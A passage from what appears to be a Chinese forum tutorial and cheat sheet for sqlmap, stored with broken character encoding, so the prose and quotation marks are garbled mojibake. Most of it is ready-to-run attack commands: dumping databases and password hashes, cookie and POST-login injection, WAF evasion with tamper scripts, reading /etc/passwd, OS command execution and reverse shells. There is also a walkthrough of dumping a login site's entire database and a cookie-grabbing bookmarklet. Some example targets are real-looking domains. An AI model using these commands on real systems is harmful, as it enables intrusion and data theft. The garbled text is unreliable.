â€“current-user // å½“å‰ç”¨æˆ· ./sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 â€“tables -D â€œæ•°æ®åº“â€ // åˆ—ä¸¾æ•°æ®åº“çš„è¡¨å ./sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 â€“columns -T â€œè¡¨åâ€ -D â€œæ•°æ®åº“â€ // èŽ·å–è¡¨çš„åˆ—å ./sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 â€“dump -C â€œå­—æ®µ,å­—æ®µâ€ -T â€œè¡¨åâ€ -D â€œæ•°æ®åº“â€ // èŽ·å–è¡¨ä¸­çš„æ•°æ®ï¼ŒåŒ…å«åˆ— å·²ç»å¼€å§‹æ‹–åº“äº†ï¼ŒSQLMAPæ˜¯éžå¸¸äººæ€§åŒ–çš„ï¼Œå®ƒä¼šå°†èŽ·å–çš„æ•°æ®å­˜å‚¨sqlmap/output/ä¸­ã€ã€ã€ 2. sqlmap postæ³¨å…¥æˆ‘ä»¬åœ¨ä½¿ç”¨Sqlmapè¿›è¡Œpoståž‹æ³¨å…¥æ—¶ï¼Œç»å¸¸ä¼šå‡ºçŽ°è¯·æ±‚é—æ¼å¯¼è‡´æ³¨å…¥å¤±è´¥çš„æƒ…å†µã€‚è¿™é‡Œåˆ†äº«ä¸€ä¸ªå°æŠ€å·§ï¼Œå³ç»“åˆburpsuiteæ¥ä½¿ç”¨sqlmapï¼Œç”¨è¿™ç§æ–¹æ³•è¿›è¡Œpostæ³¨å…¥æµ‹è¯•ä¼šæ›´å‡†ç¡®ï¼Œæ“ä½œèµ·æ¥ä¹Ÿéžå¸¸å®¹æ˜“ã€‚ 1. æµè§ˆå™¨æ‰“å¼€ç›®æ ‡åœ°å€http:// www.2cto.com /Login.asp 2. é…ç½®burpä»£ç†(127.0.0.1:8080)ä»¥æ‹¦æˆªè¯·æ±‚ 3. ç‚¹å‡»loginè¡¨å•çš„submitæŒ‰é’® 4. å¦‚ä¸‹å›¾ï¼Œè¿™æ—¶å€™Burpä¼šæ‹¦æˆªåˆ°äº†æˆ‘ä»¬çš„ç™»å½•POSTè¯·æ±‚ 5. æŠŠè¿™ä¸ªpostè¯·æ±‚å¤åˆ¶ä¸ºtxt, æˆ‘è¿™å‘½åä¸ºsearch-test.txt ç„¶åŽæŠŠå®ƒæ”¾è‡³sqlmapç›®å½•ä¸‹ 6. è¿è¡Œsqlmapå¹¶ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š ./sqlmap.py -r search-test.txt -p tfUPass è¿™é‡Œå‚æ•°-r æ˜¯è®©sqlmapåŠ è½½æˆ‘ä»¬çš„postè¯·æ±‚rsearch-test.txtï¼Œè€Œ-p å¤§å®¶åº”è¯¥æ¯”è¾ƒç†Ÿæ‚‰ï¼ŒæŒ‡å®šæ³¨å…¥ç”¨çš„å‚æ•°ã€‚ 3.sqlmap cookiesæ³¨å…¥sqlmap.py -u â€œhttp://127.0.0.1/base.phpâ€ â€“cookies â€œid=1â€³ â€“dbs â€“level 2 é»˜è®¤æƒ…å†µä¸‹SQLMAPåªæ”¯æŒGET/POSTå‚æ•°çš„æ³¨å…¥æµ‹è¯•ï¼Œä½†æ˜¯å½“ä½¿ç”¨â€“level å‚æ•°ä¸”æ•°å€¼&gt;=2çš„æ—¶å€™ä¹Ÿä¼šæ£€æŸ¥cookieæ—¶é¢çš„å‚æ•°ï¼Œå½“&gt;=3çš„æ—¶å€™å°†æ£€æŸ¥User-agentå’ŒRefererï¼Œé‚£ä¹ˆè¿™å°±å¾ˆç®€å•äº†ï¼Œæˆ‘ ä»¬ç›´æŽ¥åœ¨åŽŸæœ‰çš„åŸºç¡€ä¸Šé¢åŠ ä¸Š â€“level 2 å³å¯åˆ©ç”¨sqlmap cookiesæ³¨å…¥çªç ´ç”¨æˆ·ç™»å½•ç»§ç»­æ³¨å…¥å…ˆæŠŠç”¨æˆ·ç™»é™†çš„cookieæ‹¿åˆ°å§ï¼Œåœ¨æ”¶è—å¤¹æ·»åŠ ä¸€ä¸ªé“¾æŽ¥cookieså±žæ€§ï¼šåå­—è‡ªå·±å–javascript:alert(document.cookie)ï¼Œï¼Œéœ€è¦èŽ·å–å½“å‰cookieçš„æ—¶å€™ï¼Œç›´æŽ¥ç‚¹ä¸€ä¸‹è¿™ä¸ªé“¾æŽ¥ï¼Œç„¶åŽå¤åˆ¶ä¸€ä¸‹å¼¹å‡ºå¯¹è¯æ¡†é‡Œçš„cookieå€¼å°±æžå®šäº† sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid â€“dbms mssql â€“cookie=â€info=username=testâ€ -pæ˜¯æŒ‡æŒ‡å®šå‚æ•°æ³¨å…¥ 4. sqlmapé‡åˆ°urlé‡å†™çš„æ³¨å…¥å“ªé‡Œå­˜åœ¨æ³¨å…¥å°±åŠ ä¸Š * å· ./sqlmap.py -u â€œhttp://www.cunlide.com/id1/1*/id2/2â€œ ###5.sqlmap ç¼–ç ç»•wafæ³¨å…¥ ./sqlmap.py -u http://127.0.0.1/test.php?id=1 -v 3 â€“dbms â€œMySQLâ€ â€“technique U -p id â€“batch â€“tamper â€œspace2morehash.pyâ€åœ¨sqlmap çš„ tamperç›®å½•ä¸‹æœ‰å¾ˆå¤šspace2morehash.py ç¼–ç è„šæœ¬è‡ªè¡ŒåŠ è½½ å…¶ä»–åŸºç¡€ï¼šsqlmap -u â€œhttp://url/news?id=1â€ â€“level=3 â€“smart â€“dbms â€œMysqlâ€ â€“current-user #èŽ·å–å½“å‰ç”¨æˆ·åç§° sqlmap -u â€œhttp://www.xxoo.com/news?id=1â€ â€“level=3 â€“smart â€“dbms â€œMysqlâ€ â€“current-db #èŽ·å–å½“å‰æ•°æ®åº“åç§° sqlmap -u â€œhttp://www.xxoo.com/news?id=1â€ â€“level=3 â€“smart â€“dbms â€œMysqlâ€â€“tables -D â€œdb_nameâ€ #åˆ—è¡¨å sqlmap -u â€œhttp://url/news?id=1â€ â€“level=3 â€“smart â€“dbms â€œMysqlâ€ â€“columns -T â€œtablenameâ€ users-D â€œdb_nameâ€ -v 0 #åˆ—å­—æ®µ sqlmap -u â€œhttp://url/news?id=1â€ â€“level=3 â€“smart â€“dbms â€œMysqlâ€ â€“dump -C â€œcolumn_nameâ€ -T â€œtable_nameâ€ -D â€œdb_nameâ€ -v 0 #èŽ·å–å­—æ®µå†…å®¹ **ä¿¡æ¯èŽ·å–**sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€ â€“users #åˆ—æ•°æ®åº“ç”¨æˆ· sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€ â€“dbs#åˆ—æ•°æ®åº“ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“passwords #æ•°æ®åº“ç”¨æˆ·å¯†ç  sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“passwords-U root -v 0 #åˆ—å‡ºæŒ‡å®šç”¨æˆ·æ•°æ®åº“å¯†ç  sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€ â€“dump-all -v 0 #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“privileges #æŸ¥çœ‹æƒé™ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“privileges -U root #æŸ¥çœ‹æŒ‡å®šç”¨æˆ·æƒé™ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€ â€“is-dba -v 1 #æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€ â€“roles #æžšä¸¾æ•°æ®åº“ç”¨æˆ·è§’è‰² sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“udf-inject #å¯¼å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆèŽ·å–ç³»ç»Ÿæƒé™ï¼ï¼‰ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“dump-all â€“exclude-sysdbs -v 0 #åˆ—å‡ºå½“å‰åº“æ‰€æœ‰è¡¨ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€ â€“union-check #æ˜¯å¦æ”¯æŒunion æ³¨å…¥ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“union-cols #union æŸ¥è¯¢è¡¨è®°å½• sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€ â€“union-test #union è¯­å¥æµ‹è¯• sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€ â€“union-use â€“banner #é‡‡ç”¨union æ³¨å…¥ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“union-test â€“union-tech orderby #union é…åˆ order by sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“method â€œPOSTâ€ â€” data â€œid=1&amp;cat=2â€³ #postæ³¨å…¥ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“cookie â€œCOOKIE_VALUEâ€ #cookieæ³¨å…¥ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€-b #èŽ·å–bannerä¿¡æ¯ sqlmap -u â€œhttp://url/news?id=1â€ â€“level=3 â€“smart-v 1 -f #æŒ‡çº¹åˆ¤åˆ«æ•°æ®åº“ç±»åž‹ sqlmap -u â€œhttp://url/news?id=1â€ â€“level=3 â€“smartâ€“proxyâ€http://127.0.0.1:8118â€ #ä»£ç†æ³¨å…¥ sqlmap -u â€œhttp://url/news?id=1â€³â€“stringâ€STRING_ON_TRUE_PAGEâ€œ #æŒ‡å®šå…³é”®è¯ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“sql-shell #æ‰§è¡ŒæŒ‡å®šsqlå‘½ä»¤ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“file /etc/passwd sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“os-cmd=whoami #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“os-shell #ç³»ç»Ÿäº¤äº’shell sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“os-pwn #åå¼¹shell sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€â€“reg-read #è¯»å–winç³»ç»Ÿæ³¨å†Œè¡¨ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€ â€“dbs-o â€œsqlmap.logâ€ #ä¿å­˜è¿›åº¦ sqlmap -u â€œ â€“smart â€“dbms â€œMysqlâ€ â€“dbs -o â€œsqlmap.logâ€ â€“resume #æ¢å¤å·²ä¿å­˜è¿›åº¦ æ³¨å…¥åˆ†æ³•ä¸åŒï¼Œç§ç±»ä¸åŒï¼Œæ¥ä¸ªç®€å•çš„åˆ†ç±»ï¼š1.getåž‹ï¼šsqlmap -u â€œhttp://xxx.xx.xxx/xx.xxx?xx=xxxâ€ 2.poståž‹: sqlmap -u â€œhttp://xxx.xx.xxx/xx.xxxâ€ â€“data=â€xxxx=xxxx&amp;xxxx=xxxâ€ 3.cookieç±»æ³¨å…¥: sqlmap -u â€œhttp://xxx.xx.xxx/xx.xxx?xx=xxxâ€ â€“cookie=â€xxx=xxx&amp;xxx=xxxâ€ â€“level=2 å¥½ï¼ŒåŒºåˆ†å®Œæ¯•å†æ¥åŽç»­çš„ éœ€è¦æ•°æ®åº“å¥½ï¼šâ€“dbs å¾—åˆ°æ•°æ®åº“åç§°xxxï¼Œéœ€è¦è¡¨ï¼š -D xxx â€“tables å¾—åˆ°è¡¨åxxxxï¼Œéœ€è¦æ®µï¼š-D xxx -T xxxx â€“columns å¾—åˆ°æ®µå†…æœ‰adminï¼Œpasswordï¼Œéœ€è¦å€¼ï¼š-D xxx -T xxxx -C â€œadmin,passwordâ€ â€“dump é‚£ä¹ˆæˆ‘ä»¬æ¥ç†è§£ä¸€ä¸‹ï¼Œ-D -T -C æ˜¯å¹²å—çš„ï¼Œå½“ç„¶å°±æ˜¯çŸ¥é“å…¶åç§°ï¼ŒæŒ‡å®šä½¿ç”¨å…¶ã€‚ â€“dbs â€“tables â€“columns æ˜¯å¹²å—çš„ï¼Œå½“ç„¶å°±æ˜¯ä¸çŸ¥é“åç§°ï¼Œåˆ—å‡ºæ¥å‘— â€“dump é‚£è‡ªç„¶å°±æ˜¯å­—é¢æ„æ€ï¼Œç±»ä¼¼äºŽå¯¼å‡ºæ•°æ®çš„è¡Œä¸º å…¶å®žæ³¨å…¥æœ‰äº†ä¸Šé¢è¿™å‡ ä¸ªå‘½ä»¤ï¼Œå¦¥å¦¥çš„å¤Ÿç”¨äº†ï¼Œä¸è¿‡è¿˜éœ€è¦ç»•waf â€“tamper=â€&quot; æ³¨å…¥è¢«è¯†åˆ«å‡ºæ¥æ˜¯å·¥å…·ï¼Œæ–­å¼€å’‹åŠžâ€“user-agent=â€&quot; å†å¤šç‰›é€¼çš„åŠŸèƒ½éƒ½æ˜¯æ…¢æ…¢ç§¯ç´¯å‡ºæ¥çš„ï¼Œåˆ«æƒ³ä¸€å£åƒæˆèƒ–å­ ä¾‹å­ï¼šhttp://www.xxx.com/login.aspæœ‰postæ³¨å…¥ï¼Œæˆ‘æƒ³*äº†,ä½†æ˜¯æˆ‘ä¸æƒ³å‡ºåŽ»æ‹·è´postæ•°æ®ï¼Œå¾ˆéº»çƒ¦ï¼Œæˆ‘æƒ³è®©sqlmapè‡ªåŠ¨è·‘postæ³¨å…¥ sqlmap -u â€œhttp://www.xxx.com/login.aspâ€ â€“forms å¾ˆå¥½ï¼Œä¸Šé¢çš„å‘½ä»¤æˆåŠŸçš„å¸®æˆ‘è·‘äº†postæ³¨å…¥ï¼Œå¹¶ä¸”æ‰¾åˆ°äº†postçš„æ³¨å…¥ç‚¹jjj=123 sqlmap -u â€œhttp://www.xxx.com/login.aspâ€ â€“forms -p jjj â€“dbs äºŽæ˜¯æˆ‘ç”¨ä¸Šé¢çš„å‘½ä»¤çœ‹çœ‹æ•°æ®åº“ sqlmap -u â€œhttp://www.xxx.com/login.aspâ€ â€“forms -p jjj â€“is-dba é¡ºä¾¿çœ‹çœ‹å½“å‰ç”¨æˆ·æ˜¯ä¸æ˜¯dba sqlmap -u â€œhttp://www.xxx.com/login.aspâ€ â€“forms -p jjj -a ç”¨äº†ä¸Šé¢çš„å‘½ä»¤ -aèƒ½å¾—åˆ°ä»€ä¹ˆå‘¢ï¼šè‡ªå·±åŽ»çœ‹å¸®åŠ©å§ã€‚å¸®ä½ ç­›é€‰äº†ä¸€ä¸‹ï¼Œ-aä¸‹é¢çš„é‚£äº›å‘½ä»¤æ˜¯ç”¨æ¥çœ‹ç”¨æˆ·ï¼Œçœ‹ä¸»æœºï¼Œçœ‹æƒé™çš„ã€‚ åŽæ¥å‘¢ï¼Œæˆ‘å‘çŽ°æƒé™è¿˜æ˜¯æŒºé«˜çš„ï¼ŒåŒæ—¶å‘¢ï¼Œæˆ‘è·‘å‡ºæ¥äº†æ•°æ®åº“åç§°kkk sqlmap -u â€œhttp://www.xxx.com/login.aspâ€ â€“forms -p jjj -D kkk â€“tables åŒæ—¶æˆ‘æ‰¾åˆ°äº†ç½‘ç«™è·¯å¾„ï¼Œç„¶åŽæˆ‘å°±åˆä¸€æ¬¡æ‰¾åˆ°äº†sqlmapçš„ç‰›é€¼çš„â€“os-xxç³»åˆ—å‘½ä»¤ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ŒåŒæ—¶è¿˜å‘çŽ°äº†ç‰›é€¼çš„xpcmdshell â€“os-shell ä»¥åŠå¾ˆå¤šç‰›é€¼çš„æ–‡ä»¶æ“ä½œå‘½ä»¤â€“file-xx è¿™äº›å‘½ä»¤åœ¨éœ€è¦ç”¨çš„æ—¶å€™ä½¿ç”¨å°±æ˜¯äº†ï¼Œä¼šç»™ä½ å¸¦æ¥æ„æƒ³ä¸åˆ°çš„æƒŠå–œ ä¸Žæ­¤åŒæ—¶ï¼Œæˆ‘å‘çŽ°tablesé‡Œé¢æ²¡æœ‰æˆ‘æƒ³è¦çš„ä¸œè¥¿ï¼Œæˆ‘ä¹Ÿæ‰¾ä¸åˆ°åˆé€‚çš„å†…å®¹ï¼Œå’‹åŠžå‘¢ï¼Œå¿ƒä¸€æ¨ªï¼Œæˆ‘å†³å®šæŠŠæ‰€æœ‰çš„æ•°æ®åº“å†…å®¹è·‘å‡ºæ¥è‡ªå·±æ‰¾ï¼ŒäºŽæ˜¯æˆ‘è¿™ä¹ˆåšï¼š sqlmap -u â€œhttp://www.xxx.com/login.aspâ€ â€“forms -p jjj -D kkk â€“dump-all ç„¶åŽç‰›é€¼çš„sqlmapå°±å¼€å§‹è·‘å•Šè·‘ï¼Œç„¶åŽç´§æŽ¥ç€æˆ‘çš„è›‹å°±ç¢Žäº†ï¼Œå°¼çŽ›ï¼Œsqlmapä¸€ä¼šå°±é—®ä½ ä¸€æ¬¡è¦ä¸è¦ç ´è§£å¯†ç ï¼Œè¦ä¸è¦è¿™ä¸ªï¼Œè¦ä¸è¦é‚£ä¸ªï¼Œæˆ‘å’Œæˆ‘çš„å°æœ‹å‹ä»¬éƒ½æƒ³æ“¦ä½ å¦¹å¤«ï¼ŒåŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼Œæˆ‘åˆçœ‹è§äº†ä¸€ä¸ªå‘½ä»¤ â€“batch å¯ä»¥è‡ªåŠ¨é€‰æ‹©sqlmapé»˜è®¤é€‰é¡¹äºŽæ˜¯ï¼Œæˆ‘å¯ä»¥å’Œæˆ‘çš„å°æœ‹å‹ä»¬çŽ©è€åŽ»äº†ï¼Œå†ä¹Ÿä¸ç”¨çœ‹ç€sqlmapæ‹–åº“äº†ã€‚ æ€»ç»“ä¸‹æ¥ï¼Œå¸®åŠ©æ–‡æ¡£è¿˜æ˜¯å¾ˆé‡è¦çš„ï¼Œå¤šçœ‹çœ‹ï¼Œæ€»ä¼šæœ‰äº›æ”¶èŽ·ï¼šä¸ºäº†é¿å…å„ä½çœ‹è‹±æ–‡çœ‹åˆ°åï¼Œå¤§æ¦‚æ€»ç»“ä¸‹ï¼š Target: å­—é¢æ„æ€ï¼Œç›®æ ‡ï¼Œé‚£ä¹ˆå°±æ˜¯ç¡®å®šç›®æ ‡çš„ Request: å­—é¢æ„æ€ï¼Œè¯·æ±‚ï¼Œå°±æ˜¯å®šä¹‰è¯·æ±‚å†…å®¹çš„ï¼Œæ¯”å¦‚postæ•°æ®ï¼Œhttpå¤´ï¼Œcookieæ³¨å…¥ï¼Œhttpå¤´æ±¡æŸ“ç­‰ç­‰ Optimizationï¼šå­—é¢æ„æ€ï¼Œè°ƒèŠ‚æ€§èƒ½ï¼Œç­‰ç­‰ Injection: å­—é¢æ„æ€ï¼Œæ³¨å…¥çš„è®¾ç½®å†…å®¹åŸºæœ¬åœ¨è¿™é‡Œï¼Œæ¯”å¦‚æŒ‡å®šæ³¨å…¥ç‚¹ï¼ŒæŒ‡å®šdbï¼ŒæŒ‡å®šç³»ç»Ÿï¼Œç­‰ç­‰ Detection: åŸºæœ¬å°±æ˜¯ç”¨åœ¨ç¡®è®¤æ³¨å…¥èŒƒå›´ï¼Œå¯»æ‰¾æ³¨å…¥ç‚¹åŒºåŸŸï¼Œè¿™äº› Technique: åŸºæœ¬ç”¨åœ¨ç¡®å®šæ³¨å…¥æ‰‹æ®µï¼Œä»¥åŠæ”»å‡»æ–¹å¼ Fingerprint: åŸºæœ¬ç”¨åœ¨æŒ‡çº¹è¯†åˆ«ï¼Œç”¨çš„å¾ˆå°‘ Enumeration: æžšä¸¾ä¿¡æ¯ï¼Œä¸»è¦ç”¨åœ¨æ³¨å…¥ä¸­ï¼Œå¾ˆé‡è¦ï¼Œå¾ˆå¸¸ç”¨ Brute force: ç”¨æ¥çˆ†ç ´ï¼Œå…¶å®žä¸»è¦æ˜¯æžšä¸¾tables columnsç”¨çš„ User-defined function injection: çŽ°åœ¨åªæœ‰udfææƒï¼Œä»¥åŠæŒ‡å®šä¸€äº›è‡ªå·±å®šä¹‰çš„sqlmapè„šæœ¬ç”¨ï¼Œé«˜ç«¯ä½¿ç”¨ï¼Œæ±‚å¤§ç‰›æŒ‡ç‚¹ File system access ä¸»è¦æ˜¯æ–‡ä»¶è¯»å–ï¼Œæ–‡ä»¶å†™å…¥ Operating system access ä¸»è¦ç”¨åœ¨å¯¹ç³»ç»Ÿæ“ä½œï¼Œä¾‹å¦‚os-shell ä»¥åŠ åŽç»­çš„è¿žæŽ¥metasploit å®žçŽ°åŽæ¸—é€æ”»å‡» windows registry access åŸºæœ¬å°±æ˜¯æ³¨å†Œè¡¨æ“ä½œäº† General å­—é¢æ„æ€ï¼Œç»¼åˆçš„å†…å®¹ï¼Œä¸€äº›ç‰¹æ®Šçš„åŠŸèƒ½å®žçŽ°ï¼Œæˆ‘åœ¨è¿™é‡Œæ‰¾åˆ°äº†crawl batchè¿™äº›éžå¸¸å¥½ç”¨çš„å‚æ•° Miscellaneous ç›®æµ‹é«˜ç«¯åº”ç”¨ï¼Œè¿˜æ²¡æ€Žä¹ˆç”¨è¿‡ï¼Œæ±‚å¤§ç¥žæŒ‡æ•™ å¦‚ä¸Šé¢æ€»ç»“çš„ï¼Œå¤§æ¦‚çº¢å­—å°±æ˜¯å¸¸ç”¨çš„å‘½ä»¤ï¼Œå‰©ä¸‹çš„ä¸å¸¸ç”¨é‡Œé¢ä¹Ÿæœ‰å¾ˆå¤šå¾ˆä¸é”™ï¼Œåœ¨ç‰¹æ®Šæƒ…å†µä¸‹é€‚ç”¨çš„å†…å®¹ï¼Œåæ­£æœ¬è´´ç§‘æ™®è€Œå·²ã€‚ å­—æœ‰ç‚¹å¤šï¼Œæƒ³çœ‹çš„èœé¸Ÿæœ‹å‹è®¤çœŸçœ‹ä¸‹æ¥åº”è¯¥ä¼šæœ‰äº›æ”¶èŽ·ï¼Œèœé¸Ÿä»¬å¦‚æžœæœ‰ä»€ä¹ˆå…¶ä»–çš„å¥‡æŠ€æ·«å·§ï¼Œè¿˜å¸Œæœ›åˆ†äº«1ã€2 å…±åŒè¿›æ­¥ï¼ï¼ SQLMAPä¸­æ–‡è¯´æ˜Ž-Dç›´æŽ¥ç›´æŽ¥è¿žæŽ¥åˆ°æ•°æ®åº“ -Uç½‘å€ - URL = URLç›®æ ‡URL -Lä½¿ç”¨burp,WebScarabä»£ç†æ—¥å¿—è§£æžç›®æ ‡ä¿å­˜åœ¨æŒ‡å®šçš„æ–‡æœ¬æ–‡ä»¶ -M BULKFILEæ‰«æå¤šä¸ªç›®æ ‡å…¥ä¼ -R REQUESTFILEè´Ÿè½½çš„HTTPè¯·æ±‚ä»Žä¸€ä¸ªæ–‡ä»¶ -Gè¯»å–è°·æ­Œurlï¼Œä¼ è¯´ä¸­çš„æ‰¹é‡æ£€æµ‹ -Cä»Žé…ç½®INIæ–‡ä»¶configfileä¸­åŠ è½½é€‰é¡¹ è¦æ±‚ï¼š è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šå¦‚ä½•è¿žæŽ¥åˆ°ç›®æ ‡URLã€‚ --data=DATAé€šè¿‡POSTå‘é€æ•°æ®ä¸² --cookie=COOKIE çš„HTTP Cookieå¤´ --cookie-urlencode URLç¼–ç ç”Ÿæˆçš„cookieæ³¨å°„ --drop-set-cookieå¿½ç•¥ä»ŽSet-Cookieå¤´çš„å“åº” --user-agent=AGENT HTTP User-Agentå¤´ --random-agent éšæœºé€‰æ‹©çš„HTTP User-Agentå¤´ --referer=REFERER HTTP Refererå¤´ --headers=HEADERS HTTPå¤´æ¢è¡Œç¬¦éš”å¼€ --auth-type=ATYPE HTTPèº«ä»½éªŒè¯ç±»åž‹ï¼ˆåŸºæœ¬ï¼Œæ‘˜è¦æˆ–NTLMï¼‰ --auth-cred=ACREDçš„HTTPèº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·åï¼šå¯†ç ï¼‰ --auth-cert=ACERT ACERT HTTPè®¤è¯è¯ä¹¦ï¼ˆkey_fileï¼Œcert_fileä¸­ï¼‰ --proxy=PROXY HTTPä»£ç†è¿žæŽ¥åˆ°ç›®æ ‡URL --proxy-cred=PCRED HTTPä»£ç†èº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·åï¼šå¯†ç ï¼‰ --ignore-proxyå¿½ç•¥HTTPä»£ç† --delay=DELAYæ¯ä¸ªHTTPè¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿ --timeout=TIMEOUT ç­‰å¾…è¿žæŽ¥è¶…æ—¶ï¼ˆé»˜è®¤30ï¼‰ --retries=RETRIES é‡è¯•è¿žæŽ¥è¶…æ—¶ï¼ˆé»˜è®¤3ï¼‰ --scope=SCOPE æ­£åˆ™è¡¨è¾¾å¼æ¥è¿‡æ»¤ç›®æ ‡æä¾›ä»£ç†æ—¥å¿— --safe-url=SAFURL URLåœ°å€è®¿é—®æµ‹è¯•è¿‡ç¨‹ä¸­ç»å¸¸ --safe-freq=SAFREQè®¿é—®ä¹‹é—´çš„ä¸€ä¸ªç»™å®šçš„å®‰å…¨URL SAFREQæµ‹è¯•è¦æ±‚ ä¼˜åŒ–ï¼š è¿™äº›é€‰é¡¹å¯ä»¥ç”¨äºŽä¼˜åŒ–æ€§èƒ½çš„SqlMapã€‚ -Oå¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³ --predict-output é¢„æµ‹è¾“å‡ºé¢„æµ‹å¸¸è§çš„æŸ¥è¯¢è¾“å‡º --keep-alive ä¿æŒæ´»åŠ¨ä½¿ç”¨æŒä¹…HTTPï¼ˆSï¼‰è¿žæŽ¥ --null-connection ç©ºè¿žæŽ¥æ£€ç´¢é¡µé¢æ²¡æœ‰å®žé™…çš„HTTPå“åº”ä½“é•¿åº¦ --threads=THREADSæœ€å¤§æ•°é‡çš„å¹¶å‘HTTPï¼ˆSï¼‰è¯·æ±‚ï¼ˆé»˜è®¤ä¸º1ï¼‰ æ³¨å°„ï¼š è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šå“ªäº›å‚æ•°æµ‹è¯•ï¼Œ æä¾›å®šåˆ¶æ³¨å¡‘è½½è·å’Œå¯é€‰ç¯¡æ”¹è„šæœ¬ã€‚ -P TESTPARAMETERå¯æµ‹è¯•å‚æ•°ï¼ˆSï¼‰ --dbms=DBMSæŒ‡å®šæ•°æ®åº“ --os=OSæŒ‡å®šæ“ä½œç³»ç»Ÿ --prefix=PREFIXæ³¨å°„æœ‰æ•ˆè½½è·å‰ç¼€å­—ç¬¦ä¸² --suffix=SUFFIXæ³¨å°„æœ‰æ•ˆè½½è·åŽç¼€å­—ç¬¦ä¸² --tamper=TAMPERç¯¡æ”¹æ³¨å…¥æ•°æ®ä¸ºä½¿ç”¨ç»™å®šçš„è„šæœ¬ï¼ˆSï¼‰ æ£€æµ‹ï¼š è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šå¦‚ä½•è§£æžå’Œæ¯”è¾ƒé¡µé¢ ä»ŽHTTPå“åº”æ—¶ä½¿ç”¨ç›²SQLæ³¨å…¥æŠ€æœ¯çš„å†…å®¹ã€‚ --level=LEVELè¦æ‰§è¡Œçš„æµ‹è¯•æ°´å¹³ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º1ï¼‰ --risk=RISK æµ‹è¯•æ‰§è¡Œçš„é£Žé™©ï¼ˆ0-3ï¼Œé»˜è®¤ä¸º1ï¼‰ --string=STRINGå­—ç¬¦ä¸²åŒ¹é…å­—ç¬¦ä¸²åœ¨æŸ¥è¯¢æ—¶æ˜¯æœ‰æ•ˆçš„é¡µé¢ --regexp=REGEXPçš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åœ¨é¡µé¢æŸ¥è¯¢æ—¶æ˜¯æœ‰æ•ˆçš„ --text-only çº¯æ–‡æœ¬æ¯”è¾ƒåªå¯¹æ–‡å­—å†…å®¹ä¸ºåŸºç¡€çš„ç½‘é¡µ æŠ€å·§ï¼š è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥è°ƒæ•´ç‰¹å®šçš„SQLæ³¨å…¥æµ‹è¯• æŠ€æœ¯ã€‚ --technique=TECH SQLæ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤åšä¼Šæ–¯ç‰¹ï¼‰ --time-sec=TIMESECç§’çš„æ‹–å»¶DBMSå“åº”ï¼ˆé»˜è®¤ä¸º5ï¼‰ --union-cols=UCOLSåˆ—èŒƒå›´æµ‹è¯• --union-char=UCHARå­—ç¬¦ä½¿ç”¨æš´åŠ›ç ´è§£çš„åˆ—æ•° æŒ‡çº¹ï¼š-f, --fingerprint æŒ‡çº¹è¿›è¡Œå¹¿æ³›çš„DBMSç‰ˆæœ¬æŒ‡çº¹ æžšä¸¾ï¼š è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ—ä¸¾çš„åŽç«¯æ•°æ®åº“ ç®¡ç†ç³»ç»Ÿä¸­æ‰€åŒ…å«çš„ä¿¡æ¯ï¼Œç»“æž„å’Œæ•°æ® è¡¨ã€‚æ­¤å¤–ï¼Œæ‚¨å¯ä»¥è¿è¡Œæ‚¨è‡ªå·±çš„SQLè¯­å¥ã€‚ -bï¼Œ--banneræ•°æ®åº“çš„æ——å¸œ --current-useræ•°æ®åº“å½“å‰ç”¨æˆ· --current-dbæ£€ç´¢æ•°æ®åº“å½“å‰æ•°æ®åº“ --is-dba 